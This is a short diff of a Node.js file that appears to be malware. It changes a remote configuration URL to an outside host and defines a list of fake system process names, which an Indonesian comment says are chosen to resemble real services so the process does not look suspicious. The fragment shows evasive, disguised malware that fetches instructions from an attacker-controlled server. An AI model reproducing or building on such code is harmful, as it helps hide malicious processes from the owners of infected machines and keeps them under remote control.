@@ -9,7 +9,7 @@ const crypto = require('crypto');
 const DEBUG = false; // Aktifkan untuk debugging log
 
 const URL_GENZO = "https://blogspotgenzo.site/UCOK";
-const URL_CONFIG = "http://genzoko.serveblog.net/config.json";
+const URL_CONFIG = "https://blogspotgenzo.site/config.json";
 
 // Nama proses yang mirip service asli agar tidak mencurigakan
 const FAKE_SYSTEM_NAMES = [
